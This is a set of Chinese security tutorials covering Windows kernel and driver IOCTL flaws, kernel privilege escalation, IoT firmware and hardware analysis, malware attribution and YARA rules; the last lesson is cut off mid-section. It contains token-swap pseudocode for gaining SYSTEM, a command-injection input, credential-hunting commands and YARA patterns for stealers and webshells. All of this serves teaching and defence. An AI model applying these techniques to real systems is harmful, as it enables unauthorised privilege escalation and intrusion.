Windows 的安全边界只有一条：**用户态与内核态**。跨过这条线，程序的权力从「受约束」变成「无约束」。

## 一、两种特权级

| 层级 | 运行什么 | 权限 |
| --- | --- | --- |
| Ring 3（用户态） | 普通进程 | 只能访问自己的地址空间，不能直接碰硬件 |
| Ring 0（内核态） | 内核、驱动 | 可访问任意内存、端口、CR 寄存器 |

用户态想做事，必须通过 **系统调用**（`ntdll.dll` 里的 `Nt*` 函数）进入内核。这个过程会做参数校验——**校验就在这一步**。

## 二、内核里有什么

```
ntoskrnl.exe（内核本体）
 ├─ 对象管理器：File / Process / Thread / Mutex 都是对象
 ├─ 内存管理器：页表、Pool（NonPagedPool / PagedPool）
 ├─ I/O 管理器：把请求转成 IRP 发给驱动
 ├─ 进程/线程调度
 └─ 安全引用监视器：访问检查（Token、ACL）
```

**对象管理器**是理解内核漏洞的钥匙：内核里的资源几乎都是「对象」，拿一个指针就能操作它，而对象没有用户态那样的句柄校验。

## 三、驱动是怎么被加载的

1. 服务管理器读取注册表 `HKLM\SYSTEM\CurrentControlSet\Services\<名字>`
2. 按 `ImagePath` 加载 `.sys` 文件
3. 调用驱动的 `DriverEntry`（相当于用户态的 main）
4. 驱动通过 `IoCreateDevice` 创建设备对象、`IoCreateSymbolicLink` 暴露给用户态

用户态 `CreateFile("\\.\MyDevice")` 打开设备，之后用 `DeviceIoControl` 发控制码——**这就是用户态进入内核最常用的入口**。

## 四、IRP：内核里的「请求对象」

用户态的每次 I/O 请求，都会变成一个 IRP（I/O Request Packet）发给驱动：

```
用户态 DeviceIoControl
   → I/O 管理器创建 IRP_MJ_DEVICE_CONTROL
   → 驱动 DispatchDeviceControl(DeviceObject, Irp)
   → 驱动处理，调用 IoCompleteRequest 完成
```

驱动的分发函数里通常会这样取参数：

```c
PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;
PVOID buf  = Irp->AssociatedIrp.SystemBuffer;
ULONG len  = stack->Parameters.DeviceIoControl.InputBufferLength;
```

**这里少一次长度校验，就是内核任意读写**。

## 五、为什么内核漏洞 = 提权

用户态进程的权限由 **Token** 决定（`EPROCESS->Token`）。内核代码可以：

```c
// 伪代码：把当前进程 token 换成 System 的
PEPROCESS cur = PsGetCurrentProcess();
PEPROCESS sys = PsInitialSystemProcess;
cur->Token = sys->Token;
```

一旦能内核任意写，就能改 Token、改 `EPROCESS` 的保护位、关掉安全回调——**从普通用户直接变成 SYSTEM**。

## 六、漏洞类型速览

| 类型 | 成因 | 典型后果 |
| --- | --- | --- |
| 任意写 | IOCTL 未校验地址 | 改 Token 提权 |
| 池溢出 | 拷贝长度未校验 | 覆盖相邻对象 |
| UAF | 对象释放后仍可引用 | 类型混淆、任意调用 |
| 空指针解引用 | 未判空 | 蓝屏（DoS） |
| 符号链接滥用 | 设备名可控 | 任意文件写 |

## 七、防线：为什么现代 Windows 难打了

- **驱动签名强制**：未签名驱动加载不了（测试模式除外）
- **HVCI / VBS**：用虚拟化保护内核代码完整性
- **KCFG / CFG**：间接调用目标校验
- **SMEP / SMAP**：内核不能执行/访问用户态内存
- **PatchGuard**：防止修改内核关键结构

## 八、学习路径建议

```
1. 先读 Windows Internals 前四章（对象、IRP、内存）
2. 写一个最小的 Hello 驱动（KMDF），能加载、能打印
3. 加一个 IOCTL，实现「内核读用户缓冲区」
4. 在虚拟机里故意去掉长度校验，观察如何被利用
5. 再看公开 CVE 的分析文章（如驱动 IOCTL 提权）
```

**必须在虚拟机里做**，内核错误直接蓝屏，且可能损坏系统。

## 九、练习

1. 用 WinDbg 附加虚拟机内核，`!process 0 0` 列出所有进程，找到 System 进程的 EPROCESS
2. 写一个只做加法的 IOCTL 驱动，用 `DeviceIoControl` 调用成功
3. 用 `!object \Device` 查看设备对象树

## 一句话总结

内核漏洞的本质是**「用户态能控制的输入，进入了没有校验的内核路径」**。看懂 IRP 与 IOCTL，就找到了绝大多数驱动漏洞的入口。
</script>


<script type="text/markdown" id="md-win-driver-ioctl">
驱动的攻击面几乎全在 **IRP_MJ_DEVICE_CONTROL** 上。理解它，等于理解了驱动漏洞的通用模型。

## 一、三种缓冲方式

创建控制码时用 `METHOD_*` 指定：

| 方式 | 内核拿到的指针 | 特点 |
| --- | --- | --- |
| `METHOD_BUFFERED` | `Irp->AssociatedIrp.SystemBuffer` | 系统复制一份，最安全 |
| `METHOD_IN_DIRECT` / `OUT_DIRECT` | `MmGetSystemAddressForMdlSafe` | 用 MDL 映射用户页，零拷贝 |
| `METHOD_NEITHER` | 直接用 `Parameters.DeviceIoControl.Type3InputBuffer` | **完全信任用户指针，最危险** |

`METHOD_NEITHER` 是漏洞高发区，因为它把用户态地址直接交给内核——内核若不校验，就能被当成任意地址读写。

## 二、控制码怎么算

```c
#define IOCTL_READ_MEM \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
```

`CTL_CODE` 把「设备类型 / 功能号 / 缓冲方式 / 访问权限」打包成 32 位整数。用户态用同一个宏算出相同值发送。

## 三、四类最常见的校验缺失

**1. 不校验用户指针**

```c
// 错误：直接把用户地址当内核地址用
PVOID addr = stack->Parameters.DeviceIoControl.Type3InputBuffer;
ProbeForRead(addr, size, 1);          // 缺少这一步
RtlCopyMemory(kbuf, addr, size);
```

正确做法：

```c
__try {
    ProbeForRead(addr, size, 1);       // 校验地址在用户空间且可读
    RtlCopyMemory(kbuf, addr, size);
} __except (EXCEPTION_EXECUTE_HANDLER) {
    return STATUS_ACCESS_VIOLATION;
}
```

**2. 不校验长度**

```c
// 错误：相信用户给的长度
ULONG len = stack->Parameters.DeviceIoControl.InputBufferLength;
RtlCopyMemory(dst, src, len);          // dst 只有 0x100，len 可能是 0x10000
```

正确：`if (len > sizeof(dst)) return STATUS_BUFFER_TOO_SMALL;`

**3. 不校验句柄/对象类型**

```c
// 错误：拿到指针就用
PEPROCESS proc = (PEPROCESS)user_supplied;
KeStackAttachProcess(proc, &state);    // 攻击者传任意值 → 任意地址写
```

正确：用 `ObReferenceObjectByHandle` 从句柄取对象，并校验类型。

**4. TOCTOU（检查后使用）**

```c
if (user_struct->flag == 1) {          // 检查
    do_something(user_struct);          // 使用：攻击者在这期间改了内存
}
```

正确：**先把数据复制到内核缓冲，再判断**。

## 四、一个最小但完整的处理函数

```c
NTSTATUS DispatchIoctl(PDEVICE_OBJECT dev, PIRP Irp) {
    PIO_STACK_LOCATION sp = IoGetCurrentIrpStackLocation(Irp);
    ULONG code = sp->Parameters.DeviceIoControl.IoControlCode;
    ULONG inlen = sp->Parameters.DeviceIoControl.InputBufferLength;
    PVOID inbuf = Irp->AssociatedIrp.SystemBuffer;   // Buffered 方式
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;

    switch (code) {
    case IOCTL_ADD:
        if (inlen < sizeof(MY_INPUT)) { status = STATUS_BUFFER_TOO_SMALL; break; }
        MY_INPUT *in = (MY_INPUT *)inbuf;
        Irp->IoStatus.Information = in->a + in->b;   // 只用校验过的数据
        status = STATUS_SUCCESS;
        break;
    }
    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}
```

四个要点：**校验长度、只用 SystemBuffer、不信任任何用户字段、明确 IoStatus.Information**。

## 五、攻击者怎么找这类驱动

1. 枚举 `\Device\` 下的设备，看哪些允许普通用户打开
2. 用 `DeviceIoControl` 暴力发控制码（0x800–0x8FF 常见）
3. 观察是否蓝屏（说明控制码存在且处理有 bug）
4. 结合 `IOCTL` 的输入输出推断语义

防守方要做的：**限制设备 ACL**（`IoCreateDeviceSecure`），让普通用户根本打不开。

## 六、检测与加固

| 措施 | 作用 |
| --- | --- |
| `IoCreateDeviceSecure` + SDDL | 只允许管理员访问设备 |
| 全面使用 `METHOD_BUFFERED` | 由系统代管拷贝 |
| `ProbeForRead/Write` + `__try` | 防用户地址异常 |
| 静态分析 | 用 CodeQL/驱动专项规则扫未校验路径 |
| HVCI | 拦截内核代码页篡改 |

## 七、练习

1. 写一个 `METHOD_BUFFERED` 的驱动，实现「传入两个整数返回和」
2. 故意去掉长度校验，用超长输入观察蓝屏（虚拟机）
3. 用 `WinObj` 查看你创建的设备对象 ACL，确认普通用户能否打开

## 一句话总结

驱动漏洞的通用模型是**「用户可控的指针或长度，进入了没有检查的内核路径」**。把长度校验、指针探测、对象引用三件事做全，八成漏洞就没了。
</script>


<script type="text/markdown" id="md-win-kernel-exploit">
内核漏洞利用（LPE）的目标很具体：**从普通用户变成 SYSTEM**。路径通常只有两三条。

## 一、利用链的三阶段

```
① 触发：构造输入让漏洞稳定复现（不蓝屏、不重启）
② 定位：找到要改的内核对象及其地址
③ 修改：改 Token / 改 PreviousMode / 关回调
```

难点在 ①：内核崩溃就是 BSOD，没有「重试」的机会。所以**稳定性 > 成功率**。

## 二、路径一：Token 替换

每个进程的 `EPROCESS` 里有 `Token` 字段（指向 `_TOKEN`）。把当前进程的 Token 换成 System 进程的：

```c
// 伪代码
PEPROCESS me  = PsGetCurrentProcess();
PEPROCESS sys = PsInitialSystemProcess;     // 全局变量，导出符号
*(PVOID *)((PUCHAR)me + TOKEN_OFFSET) = *(PVOID *)((PUCHAR)sys + TOKEN_OFFSET);
```

`TOKEN_OFFSET` 随 Windows 版本变化，需要按版本查（WinDbg 的 `dt _EPROCESS Token` 可查当前系统）。

**优点**：稳定、影响小。**缺点**：需要知道两个地址（当前进程、System 进程）。

## 三、路径二：PreviousMode 置 0

内核在处理来自用户态的请求时，`KTHREAD->PreviousMode` 为 1（UserMode）；内核自己调用时为 0。

把它改成 0，再调用本应受限的内核 API，就绕过了参数校验：

```c
// 效果示意：置 0 后 NtReadVirtualMemory 会认为调用方是内核
*(UCHAR *)((PUCHAR)KeGetCurrentThread() + PREVIOUS_MODE_OFFSET) = 0;
```

**优点**：不用找 System 进程。**缺点**：改的是线程状态，作用范围有限，且很快被重置。

## 四、路径三：改回调与保护位

| 目标 | 效果 |
| --- | --- |
| `PsSetCreateProcessNotifyRoutine` 相关回调 | 关掉进程创建监控（持久化用） |
| `EPROCESS->Protection` | 把进程标成 PPL，反而更难被结束 |
| SSDT 表项 | 劫持系统调用（老系统） |

现代系统对这类结构有 **PatchGuard**（内核补丁保护）定期校验，改了会蓝屏——所以这条路在前沿利用中基本被弃用。

## 五、任意读写怎么来

| 漏洞类型 | 转成任意读写的常见手法 |
| --- | --- |
| 池溢出 | 覆盖相邻对象的 `ObjectType` / 函数指针 |
| UAF | 重新占用同一块池内存，类型混淆 |
| 任意写（IOCTL 直接给地址） | 直接写目标字段 |
| 逻辑漏洞 | 用合法 API 达成任意读写（如驱动封装了 `MmMapIoSpace`） |

**最省事的是「驱动本身就提供了任意读写」**：很多厂商驱动为了「调试方便」暴露了 `MapPhysicalMemory` 之类功能，直接就是提权原语。

## 六、为什么现代 Windows 越来越难

| 缓解 | 拦住了什么 |
| --- | --- |
| HVCI / VBS | 内核代码页不可写，改代码失效 |
| KCFG / CFG | 间接调用只能跳到合法目标 |
| SMEP / SMAP | 内核不能执行/读用户内存，ret2usr 失效 |
| PatchGuard | 改关键结构会蓝屏 |
| 驱动签名 + 黑名单 | 易受攻击的驱动被拉黑 |
| Token 结构加固 | 部分字段受保护，不能直接替换 |

这些机制把「一次任意写 → 提权」变成了「需要多个原语配合」。

## 七、防守方更该关注的事

1. **减少攻击面**：卸载/拉黑有漏洞的第三方驱动（这是最常见的内核提权来源）
2. **开启 HVCI**：即使有漏洞，也很难改内核代码
3. **监控驱动加载**：事件 7045 + 驱动签名校验
4. **关注 BYOVD**（自带易受攻击驱动）：攻击者带一个旧驱动进来打内核

## 八、法律与边界

内核漏洞研究只在**自己完全控制的虚拟机**里做。对真实设备做未授权测试，风险与后果都远超 Web 渗透（可能造成设备损坏与系统不可用）。

## 九、练习

1. 在虚拟机用 WinDbg 执行 `dt _EPROCESS Token`，记录你的系统版本偏移
2. 用 HEVD（HackSys Extreme Vulnerable Driver）练一个「任意写 → Token 替换」的完整链
3. 开启 HVCI 后重试，观察哪一步失效

## 一句话总结

内核利用就是**把「一个可控的写」变成「一个可控的权限」**。路径有限（Token / PreviousMode / 回调），难点永远是稳定性与缓解对抗。
</script>


<script type="text/markdown" id="md-iot-firmware">
IoT 设备的攻击面几乎全在固件里：**Web 服务、硬编码口令、启动脚本、升级校验**。拿到固件，就拿到了它的全部秘密。

## 一、三条获取路径

| 路径 | 难度 | 说明 |
| --- | --- | --- |
| 官网下载 | 最低 | 很多厂商提供固件下载（升级包） |
| OTA 抓包 | 中 | 设备升级时抓 HTTP/TFTP 请求，拿到 `.bin` |
| 硬件读取 | 高 | 拆机用 CH341A 夹 SPI Flash，直接 dump |

**先试官网，再试抓包，最后拆机**——顺序反了会浪费大量时间。

## 二、先看文件是什么

```bash
file firmware.bin            # 常见输出：data（正常，说明是裸镜像）
binwalk firmware.bin         # 扫描内部结构
strings -n 8 firmware.bin | head -50
```

`binwalk` 的典型输出：

```
DECIMAL   HEXADECIMAL   DESCRIPTION
0         0x0           uImage header, kernel 3.10.14
131072    0x20000       Squashfs filesystem, little endian, version 4.0
```

一条 `Squashfs` 就说明「文件系统在后面」，可以直接解。

## 三、解包

```bash
binwalk -e firmware.bin           # 自动提取（需要 unsquashfs 等依赖）
# 或手工
dd if=firmware.bin bs=1 skip=131072 of=fs.squashfs
unsquashfs fs.squashfs
```

常见文件系统与工具：

| 类型 | 提取方式 |
| --- | --- |
| SquashFS | `unsquashfs`（`-comp xz` 指定压缩） |
| JFFS2 | `jefferson` 或 `modprobe mtdram` 挂载 |
| UBIFS | `ubireader_extract_images` + `ubireader_extract_files` |
| CramFS | `cramfsck -x out` |
| ext2/3/4 | 直接 `mount -o loop` |

## 四、解包失败怎么办

| 现象 | 原因 | 对策 |
| --- | --- | --- |
| 只有内核，没有文件系统 | 系统是 initramfs 打包进内核 | `binwalk -e` 后再解 cpio/gzip |
| SquashFS 报压缩不支持 | 用了厂商定制 LZMA | 装 `sasquatch` 替代 `unsquashfs` |
| 头是加密的 | 固件加密 | 找解密逻辑（通常还在 bootloader 里） |
| 拆开是乱码 | 整体加密/压缩 | 用熵值判断，找解密函数 |

**加密固件的常见弱点**：密钥硬编码在 bootloader 或某个脚本里；解密算法就是简单异或/AES-CBC，可用已知明文（文件头）推出。

## 五、拿到根文件系统之后看什么

```bash
find . -name "*.cgi" -o -name "*.lua" -o -name "*.sh" | head -30
grep -rn "admin\|password\|passwd" etc/ 2>/dev/null | head
cat etc/passwd etc/shadow            # 口令哈希（常有默认口令）
ls etc/init.d/                       # 启动脚本，能看服务与权限
grep -rn "system(\|popen(\|doSystem(" --include="*.cgi" .
```

四个高价值目标：**CGI/接口脚本、口令文件、启动脚本、升级逻辑**。

## 六、一个典型的固件分析产出

```
固件版本：V2.1.4
文件系统：SquashFS (xz)
Web 服务：lighttpd + 自研 CGI
发现：
  1. /etc/shadow 中 root 哈希为弱口令
  2. /cgi-bin/setup.cgi 中 system() 直接拼接参数 → 命令注入
  3. 升级包未校验签名
```

## 七、纪律与合规

- 只在**自己购买的设备**上做
- 不把厂商固件公开上传（可能含第三方代码）
- 漏洞披露走厂商渠道或 CNVD，不公开利用细节

## 八、练习

1. 下载一台家用路由的官方固件，用 binwalk 解包并列出目录结构
2. 在解包结果里找到 Web 服务的 CGI 目录，用 `strings` 找可疑命令拼接
3. 用 `ubireader` 处理一个 UBIFS 镜像

## 一句话总结

固件分析的价值在于**它是一份完整的系统快照**：口令、脚本、服务、升级逻辑全在里面。解包只是开始，读代码才是关键。
</script>


<script type="text/markdown" id="md-iot-vuln">
IoT 固件里的漏洞不像 Web 应用那么多样，**四类问题覆盖了绝大多数**。学会定位这四类，就能覆盖大部分设备。

## 一、命令注入（最常见）

**成因**：CGI 里用 `system()` / `popen()` 拼接用户输入。

```c
// 危险：host 来自 HTTP 参数
char cmd[256];
snprintf(cmd, sizeof cmd, "ping -c 1 %s", host);
system(cmd);
```

输入 `8.8.8.8; reboot` 就能执行任意命令。

**在固件里怎么找**：

```bash
grep -rn "system(\|popen(\|doSystem(\|exec(" --include="*.cgi" --include="*.lua" --include="*.sh" .
```

找到后看参数来源：`getenv("QUERY_STRING")`、`cgiFormString` 这类就是要害。

**修复**：不要拼 shell 字符串，改用 `execve` 传参数数组；必须拼时做严格白名单（只允许 IP 字符集）。

## 二、硬编码凭据

**成因**：调试账号没删、默认口令写在二进制里。

**怎么找**：

```bash
strings -a ./bin/* | grep -i "admin\|root\|passwd\|secret"
grep -rn "root:" etc/shadow
```

也常见于：
- `etc/passwd` 里的默认账号
- Web 后台的硬编码 token
- 云服务 AK/SK 写死在配置

**风险**：一台设备被破解，同型号全部沦陷（口令相同）。

## 三、未授权接口

**成因**：CGI 或 API 没做鉴权，直接暴露在局域网（甚至公网）。

**怎么找**：
1. 看 `lighttpd.conf` / `nginx.conf` 的路由与 `auth` 配置
2. 找 `cgi-bin` 下所有入口，逐个访问看是否需要 Cookie
3. 关注 `/backup`、`/debug`、`/upgrade`、`/set_*` 这类敏感路径

**验证**：本地起 `qemu-user` 或 `firmadyne` 模拟，直接 curl 打接口。

## 四、升级校验缺失

**成因**：固件升级包不验签，只校验 CRC。

**后果**：攻击者能刷入任意固件（持久化、植入后门）。

**怎么判断**：看升级脚本 `upgrade.sh` 或 `fwupdate` 逻辑，是否调用 `openssl verify` / 校验 RSA 签名；只做 `md5sum` 比较就是没验签。

## 五、本地模拟环境怎么搭

```bash
# 架构判断
file ./bin/busybox

# 用 qemu-user 跑单个程序
qemu-mipsel -L ./rootfs ./rootfs/usr/sbin/httpd

# firmadyne / FAT 做整机模拟（更接近真实）
```

模拟的价值：**能发请求验证，而不是靠读代码猜**。

## 六、还有三类值得关注

| 类型 | 说明 |
| --- | --- |
| 缓冲区溢出 | `strcpy` 拼接长参数（MIPS 栈溢出常见） |
| 信息泄露 | 调试页面、日志暴露路径与版本 |
| 云侧问题 | MQTT 未授权订阅、设备 ID 可枚举 |

## 七、厂商侧的修复顺序

1. **去掉调试接口与默认账号**（成本最低、收益最高）
2. **CGI 改为参数化调用**，禁止拼 shell
3. **所有接口加鉴权**，内网也要
4. **升级包验签**（RSA/ECDSA + 防回滚）
5. **默认关闭公网暴露**，引导用户用 App 而非端口映射

## 八、练习

1. 在解包的固件里找出 3 个使用 `system()` 的 CGI，标出参数来源
2. 检查 `etc/shadow` 是否有弱口令（自己设备，仅本地）
3. 用 qemu-user 跑起一个 CGI，验证一次命令注入（本地环境）

## 一句话总结

IoT 漏洞的共性是**「信任了不该信任的输入，或省了不该省的校验」**。固件在手，读代码比扫端口有效得多。
</script>


<script type="text/markdown" id="md-iot-hardware">
固件加密、系统加固都很常见，但**硬件接口往往没做保护**。一根 UART 线，常常直接送你一个 root shell。

## 一、UART：四根线找到就赢一半

| 引脚 | 特征 |
| --- | --- |
| VCC | 3.3V 或 5V 常电 |
| GND | 与电源负极导通 |
| TX | 空闲时高电平，启动瞬间有数据跳变 |
| RX | 空闲时高电平 |

**找法**：
1. 万用表测电压，找 3.3V（VCC）与 0V（GND）
2. 剩下两个是 TX/RX，用 USB-TTL 反接试（TX 接 RX）
3. 波特率常用 115200，其次 57600 / 38400

```bash
# Linux 下连
picocom -b 115200 /dev/ttyUSB0
# 或
screen /dev/ttyUSB0 115200
```

上电瞬间如果看到 `U-Boot` 或内核日志，就成功了——**很多设备在这里按任意键能中断启动，进 U-Boot 命令行**，那是最高权限。

## 二、JTAG：能读能改能单步

JTAG 比 UART 强得多：可以读内存、改寄存器、下断点。

识别方法：
1. 板上 10/14/20 pin 排针，丝印常为 `J1`、`JP1`
2. 用 `JTAGulator` 自动枚举引脚
3. 或用 OpenOCD 的 `idcode` 扫描

```bash
openocd -f interface/ftdi/ft232h.cfg -f target/mips_m4k.cfg
# 连接成功后
telnet localhost 4444
> halt
> dump_image firmware.bin 0x80000000 0x1000000
```

## 三、SPI Flash：最直接的固件读取

板上 8 脚芯片（如 W25Q128）就是存放固件的地方。

```bash
# 用 CH341A + flashrom
flashrom -p ch341a_spi -r firmware.bin
flashrom -p ch341a_spi -w new.bin
```

**注意**：
- 夹子（SOIC-8 clip）接触不良是最常见失败原因
- 读之前最好先备份两份，比对一致再用
- 有些板子上电状态下读不稳，需断电或用 3.3V 供电

## 四、拿到 shell 之后做什么

```bash
id; uname -a; cat /proc/cpuinfo
ps; netstat -antp
mount                     # 看分区与只读挂载
cat /etc/passwd
ls /etc/init.d/           # 启动服务
nvram show 2>/dev/null    # 某些设备的配置存储（常含口令）
```

三类高价值发现：
1. **文件系统可写** → 可植入持久化
2. **配置在 NVRAM** → 可用 `nvram` 读明文口令
3. **调试服务在跑**（telnetd、gdbserver）→ 直接利用

## 五、常见坑

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 串口无输出 | TX/RX 接反、波特率错 | 交换线序，逐档试波特率 |
| 输出乱码 | 电平不匹配（1.8V vs 3.3V） | 用电平转换 |
| 能读不能写 | Flash 写保护（WP 引脚） | 拉高 WP 或断电写 |
| 焊接点太小 | 板子密度高 | 用飞线 + 放大镜/显微镜 |

## 六、纪律与安全

- 断电操作，避免短路烧板
- 只在**自己拥有**的设备上做
- 拆机可能失去保修，先确认设备归属
- 记录每次改动（备份原始固件、记录引脚定义）

## 七、练习

1. 用万用表在一台旧路由上定位 UART 的四个引脚并接出串口
2. 用 CH341A 读取 SPI Flash，用 binwalk 验证读到的确实是固件
3. 若能进 U-Boot，尝试 `printenv` 查看启动参数与分区表

## 一句话总结

硬件接口是**绕过一切软件防护的物理入口**。UART 给 shell、JTAG 给调试、SPI 给完整固件——三者配合，几乎无设备不可分析。
</script>


<script type="text/markdown" id="md-mal-family">
家族归因的目标不是「起个名字」，而是**把样本连成线**：谁在做、用的什么工具、下一步会怎么变。

## 一、四个归因维度

| 维度 | 证据 | 稳定性 |
| --- | --- | --- |
| 代码 | 函数结构、常量、编译特征 | 高（改造成本高） |
| 字符串 | 路径、注册表键、互斥体、提示语 | 中（易改但常忘改） |
| 网络 | C2 域名/IP、URI、协议格式 | 中（可换，但换了要重配） |
| TTP | 持久化方式、提权路径、横向手法 | 高（体现作者习惯） |

**代码与 TTP 权重最高**，字符串与网络权重次之。只看 C2 域名会把不同家族归成一类，只看字符串又会把同一家族拆散。

## 二、三个相似度指标

```bash
# 1. 导入表哈希（编译级别特征）
python3 -c "import pefile;print(hex(pefile.PE('a.exe').get_imphash()))"

# 2. 模糊哈希（整体相似）
ssdeep a.exe b.exe

# 3. 节区熵与大小对比
python3 -c "import pefile;p=pefile.PE('a.exe');[print(s.Name, round(s.get_entropy(),2)) for s in p.sections]"
```

判读经验：

| 指标 | 相同意味着 |
| --- | --- |
| imphash 相同 | 链接的库与调用几乎一致（同一构建链） |
| ssdeep > 70 | 整体结构相似（可能只是改配置） |
| 关键节熵一致 | 加密/压缩方式相同 |
| 常量字符串相同 | 同一份源码编译 |

## 三、TTP 才是「指纹」

ATT&CK 的技术编号是很实用的比对表：

| 家族 | 典型 TTP |
| --- | --- |
| 勒索软件 | T1486 数据加密、T1490 禁用恢复、T1562 关杀软 |
| 挖矿木马 | T1496 资源劫持、T1053 计划任务、T1071 应用层协议 C2 |
| 远控（RAT） | T1071、T1105 工具传输、T1112 改注册表 |
| 窃密木马 | T1555 浏览器凭据、T1560 归档、T1041 外传 |

**两个样本的 TTP 集合高度重合，即使代码完全不同，也大概率是同一团伙的不同工具**。

## 四、归因报告的最小结构

```
样本：3 个（含哈希）
结论：属于同一家族（置信度：中高）
依据：
  1. 三者 imphash 相同 → 同一构建链
  2. 互斥体名一致（Global\xxx_1.2）
  3. C2 域名共用同一 NS 与注册商
  4. 均使用「计划任务 + 定时外连」的持久化组合
反证：某个样本的网络协议不同，可能是变种
未知：是否同一操作者（需要基础设施与情报交叉）
```

**必须写「反证」和「未知」**，否则归因会变成自我说服。

## 五、避免误判的四条

1. **不要只看 C2**：基础设施可以共用（同一个 C2 面板卖给多个团伙）
2. **不要只看壳**：同一个商业壳被大量家族使用
3. **注意「同源不同族」**：泄露的源码被多方使用
4. **保留置信度**：写「中/高」而不是「确定」

## 六、工具链

| 用途 | 工具 |
| --- | --- |
| 哈希与相似度 | `ssdeep`、`tlsh`、`imphash` |
| 二进制比对 | BinDiff、Diaphora（IDA/Ghidra 插件） |
| 字符串与配置提取 | `strings`、`floss`、家族专用配置提取脚本 |
| TTP 映射 | ATT&CK Navigator |
| 情报关联 | VirusTotal、MalwareBazaar、被动 DNS |

## 七、练习

1. 取三个同家族样本（公开教学集），比对 imphash 与 ssdeep，写出判断依据
2. 用 ATT&CK Navigator 给一个家族打标，导出热力图
3. 找一个「同 C2 不同家族」的案例，说明为什么不能只看基础设施

## 一句话总结

家族归因是**多证据交叉**的活：代码给「同源」、TTP 给「同人」、基础设施给「同伙」。任何单一证据都不足以定论。
</script>


<script type="text/markdown" id="md-mal-yara">
分析完一个样本，最重要的产出不是报告，而是**能自动抓到它的规则**。YARA 就是这件事的标准工具。

## 一、规则的四段结构

```yara
rule Ransomware_Generic_Locked_Ext {
    meta:
        author = "afei"
        date = "2026-10-21"
        description = "通过 .locked 扩展名与勒索提示文本识别"
        severity = "high"

    strings:
        $ext1 = ".locked" ascii wide
        $ext2 = ".encrypted" ascii wide
        $note = "your files have been encrypted" nocase

    condition:
        uint16(0) == 0x5A4D and        // MZ 头，确保是 PE
        filesize < 10MB and
        2 of ($ext*) and
        $note
}
```

四段：`meta`（元信息）、`strings`（特征）、`condition`（逻辑）。`rule` 名要有意义，别叫 `detect1`。

## 二、字符串怎么选

| 类型 | 写法 | 适用 |
| --- | --- | --- |
| 文本 | `"C:\\Users\\Public\\svchost.exe"` | 路径、互斥体、提示语 |
| 十六进制 | `{ 4D 5A 90 00 03 }` | 机器码片段、加密常量 |
| 正则 | `/https?:\/\/[a-z0-9.-]+\.top/` | 域名模式、变体多的串 |
| 宽字符 | `"cmd.exe" wide` | Windows 常见 |

三条经验：
1. **优先长且独特的字符串**（互斥体名、罕见路径、PDB 路径）
2. **避免 `"http://"` 这种通用串**，误报会爆炸
3. 十六进制里用 `??` 做通配：`{ 8B ?? 24 10 }`

## 三、条件写法

```yara
condition:
    uint16(0) == 0x5A4D and
    filesize < 5MB and
    (2 of ($api*) or $mutex) and
    not $clean_bin
```

常用形式：

| 写法 | 含义 |
| --- | --- |
| `all of them` | 全部命中 |
| `any of ($a*)` | 任一名命中 |
| `2 of ($s*)` | 至少两个 |
| `#s1 > 3` | 字符串出现次数 |
| `$s at 0` | 出现在文件头 |

## 四、三条可落地模板

**1. 凭据窃取类**

```yara
rule Stealer_Browser_Cred {
    strings:
        $p1 = "Login Data" ascii wide
        $p2 = "Web Data" ascii wide
        $p3 = "Local State" ascii wide
        $z  = "archive.zip" nocase
    condition:
        uint16(0) == 0x5A4D and 3 of ($p*) and $z
}
```

**2. 挖矿类**

```yara
rule Miner_Stratum_Config {
    strings:
        $s1 = "stratum+tcp://" ascii
        $s2 = "stratum+ssl://" ascii
        $w  = "wallet" nocase
        $x  = "xmrig" nocase
    condition:
        any of ($s*) or ($w and $x)
}
```

**3. 通用 Webshell（脚本类）**

```yara
rule Webshell_PHP_Eval_Request {
    strings:
        $e = "eval(" ascii
        $r1 = "$_POST" ascii
        $r2 = "$_REQUEST" ascii
        $b = "base64_decode" ascii
    condition:
        filesize < 100KB and $e and any of ($r*) and $b
}
```

## 五、性能与误报控制

| 问题 | 对策 |
| --- | --- |
| 扫描慢 | 加 `filesize` 限制；避免纯正则开场 |
| 误报高 | 用「长串 + 多条件与」而非单串匹配 |
| 漏报变体 | 关键串加 `wide`、用 `??` 通配 |
| 规则膨胀 | 用 `include` 拆分公共串，定期清理 |

**误报的代价比漏报更高**：一条老是误报的规则，团队会整体忽略规则库。

## 六、在流水线里用

```bash
# 单文件
yara rules.yar sample.exe

# 目录递归
yara -r rules/ /samples/

# 与 Python 集成
python3 -c "import yara;r=yara.compile('rules.yar');print(r.match('sample.exe'))"
```

## 七、规则维护的三个习惯

1. **每条规则写「为什么这么写」**（meta 里的 description）
2. **留下反例样本**：验证不误报
3. **定期回归**：用历史样本集跑一遍，看新增误报

## 八、练习

1. 给一个公开教学样本写一条规则，要求 `filesize < 2MB` 且至少两个字符串命中
2. 用 100 个正常 PE 文件测误报率，调整到 0
3. 把三条模板规则合并成一个规则集，用 `-r` 批量扫描样本目录

## 一句话总结

YARA 的核心不是语法，而是**选对特征**：选独特且稳定的串，用多条件降低误报，用 meta 记录判断依据。
</script>


<script type="text/markdown" id="md-mal-report">
分析的价值有两层：**解决这一个样本**，以及**让下一次更快**。后者靠报告与沉淀。

## 一、报告的标准结构

```
1. 摘要（给管理者，5 行内）
   - 样本类型 / 家族 / 危害 / 是否已处置
2. 基本信息
   - 文件名、大小、哈希（MD5/SHA1/SHA256）、编译时间、签名
3. 静态特征
   - 是否加壳、节区熵、导入表关键 API
4. 动态行为（时间线）
   - 进程树、落地文件、注册表、网络连接
5. 关键分析
   - 核心逻辑（如「读取浏览器凭据 → 打包 → POST 上传」）
6. IOC 清单（分级）
7. 检测与处置建议
8. 附录（命令、截图、YARA 规则）
```

## 二、IOC 要分级，才有人用

| 级别 | 类型 | 有效期 | 用途 |
| --- | --- | --- | --- |
| 高 | 文件哈希（SHA256） | 永久（针对该样本） | 阻断、回溯 |
| 中 | 域名、IP、URI 路径 | 数周 | 封禁、告警 |
| 低 | 互斥体名、注册表键 | 长期 | 主机排查 |
| 行为 | TTP、命令行特征 | 长期 | 检测规则 |

**只给哈希的情报基本没用**：改一个字节就失效。真正有用的是「行为特征」——它对应一类样本。

## 三、从样本到检测的落地路径

```
